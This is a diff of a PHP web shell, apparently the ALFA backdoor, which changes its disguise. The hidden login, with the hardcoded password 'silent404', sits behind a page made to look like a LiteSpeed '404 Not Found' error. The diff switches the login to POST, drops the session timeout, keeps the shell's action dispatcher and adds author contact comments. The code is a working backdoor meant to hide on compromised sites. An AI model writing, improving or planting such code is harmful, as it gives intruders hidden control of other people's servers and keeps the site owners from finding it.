@@ -30,8 +30,6 @@ foreach ($headers as $key => $value) {
 }
 
 // =============== END PROTEKSI ================= //
-
-// === Konfigurasi PHP ===
 session_start();
 date_default_timezone_set('Asia/Jakarta');
 
@@ -97,108 +95,87 @@ if (($now - $lastTime) >= 7200) {
 ?>
 <?php
 $password = "silent404";
-
-// Cek logout manual
+// Handle logout
 if (isset($_GET['logout'])) {
     session_destroy();
-    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
+    header("Location: ".$_SERVER['PHP_SELF']);
     exit;
 }
 
-// Cek timeout otomatis
-if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 300)) {
-    session_unset();
-    session_destroy();
-    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
-    exit;
+// Handle login
+if (isset($_POST['pass']) && $_POST['pass'] === $password) {
+    $_SESSION['logged_in'] = true;
 }
 
-// Update waktu aktivitas terakhir
-$_SESSION['last_activity'] = time();
-
-// Proses login
-if (isset($_GET['hidden_pass']) && $_GET['hidden_pass'] === 'silent404') {
-    $_SESSION['is_logged_in'] = true;
-}
-
-// Tampilkan halaman login jika belum login
-if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     ?>
     <!DOCTYPE html>
     <html>
     <head>
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<title>404 Not Found</title>
-		<style>
-			body {
-				background-color: #fff;
-				text-align: center;
-				font-family: Arial, sans-serif;
-				color: #333;
-			}
-			.container {
-				margin-top: 10%;
-			}
-			.container h1 {
-				font-size: 50px;
-				font-weight: bold;
-				color:rgb(0, 0, 0);
-			}
-			.container p {
-				font-size: 24px;
-				color: #666;
-			}
-			.container img {
-				width: 200px;
-			}
-			form {
-				display: none;
-				margin-top: 20px;
-			}
-			form input {
-				padding: 10px;
-				font-size: 20px;
-				width: 100px;
-				border: 1px solid #ccc;
-			}
-			.btn {
-				background-color: #4CAF50;
-				color: white;
-				padding: 10px 20px;
-				font-size: 18px;
-				border: none;
-				cursor: pointer;
-			}
-            form {
-                margin-top: 30px;
+        <title>404 Not Found</title>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                background: #fff;
+                color: #444;
+                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+                text-align: center;
+            }
+            h1 {
+                font-size: 160px;
+                margin-top: 300px;
+                margin-bottom: 0;
+                font-weight: bold;
+            }
+            h2 {
+                margin: 5px 0;
+                font-size: 36px;
+            }
+            p {
+                font-size: 16px;
+                color: #666;
+            }
+            .footer {
+                background: #333;
+                color: #aaa;
+                padding: 10px;
+                font-size: 12px;
+                position: fixed;
+                bottom: 0;
+                width: 100%;
+                left: 0;
+            }
+            #loginform {
                 display: none;
+                margin-top: 20px;
             }
             input[type="password"] {
                 padding: 10px;
                 font-size: 16px;
-                border: 1px solid #ccc;
+                width: 250px;
+                margin: 5px;
             }
             input[type="submit"] {
-                padding: 10px 15px;
+                padding: 10px 20px;
                 font-size: 16px;
-                background-color: #c00;
-                color: white;
-                border: none;
-                cursor: pointer;
             }
         </style>
     </head>
     <body>
-        <img style="width:500px;" src="https://res.cloudinary.com/dnromfcqt/image/upload/v1745048518/something-lost_eyyila.png" alt="404 Image" width="300">
-        <h1>Oops, looks like the page is lost.</h1>
-        <p>This is not a fault, just an accident that was not intentional.</p>
+        <h1>404</h1>
+        <h2>Not Found</h2>
+        <p>The resource requested could not be found on this server!</p>
 
-        <!-- Form login tersembunyi -->
-        <form method="GET" style="display: none;">
-            <input type="password" name="hidden_pass" />
+        <form method="post" id="loginform">
+            <input type="password" name="pass" placeholder="Enter password" />
             <input type="submit" value="Login" />
         </form>
+
+        <div class="footer">
+            Proudly powered by LiteSpeed Web Server<br>
+            Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.
+        </div>
     </body>
     </html>
     <?php
@@ -6727,5 +6704,10 @@ else
 $_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
-exit;	
+exit;
+/*
+#Persian Gulf For Ever
+#skype : sole.sad
+#skype : ehsan.invisible
+*/
 ?>
